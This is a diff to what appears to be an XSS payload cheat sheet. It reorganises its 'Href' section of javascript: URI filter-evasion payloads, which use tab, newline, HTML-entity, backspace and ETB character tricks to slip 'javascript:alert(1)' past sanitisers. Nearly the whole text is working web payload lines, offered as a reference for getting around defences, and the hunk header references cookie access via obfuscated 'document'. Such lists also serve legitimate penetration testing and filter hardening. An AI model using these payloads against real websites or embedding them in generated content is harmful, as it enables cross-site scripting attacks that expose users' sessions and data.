@@ -35,12 +35,10 @@ window["doc"+"ument"]["cookie"]
 
 ### Href
 
-```js
+```
 <!--javascript -->
 javascript:alert(1)
 JaVaScript:alert(1)
-javascript	:alert(1) # tab (0x9), newline (0xa) and carriage return (0xd) allowed
-&#x8; &#23;   javascript:alert('Successful XSS')
 ja&Tab;vascript:alert(1)
 java\tscript:alert(1)
 ja&NewLine;vascript:alert(1)
@@ -48,9 +46,21 @@ ja&#x0000A;vascript:alert(1)
 java&#x73;cript:alert()
 &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')
 
-# Line break
+# tab (0x9), newline (0xa) and carriage return (0xd) allowed 
+
 ja
-vascript:alert(1)
+vascript:alert(1) # New line 
+
+jav	asc	ript	:alert(1) # Tab
+
+# Special Characters (you can use them before) Somes Example :
+
+javascript:alert(1) # ETB Raw
+&#23;javascript:alert('Successful XSS') # ETB HTML
+
+&#x8;javascript:alert(1) # Backspace HTML
+javascript:alert(1) # Backspace Raw
+
 
 <!--::colon:: -->
 javascript&colon;alert()
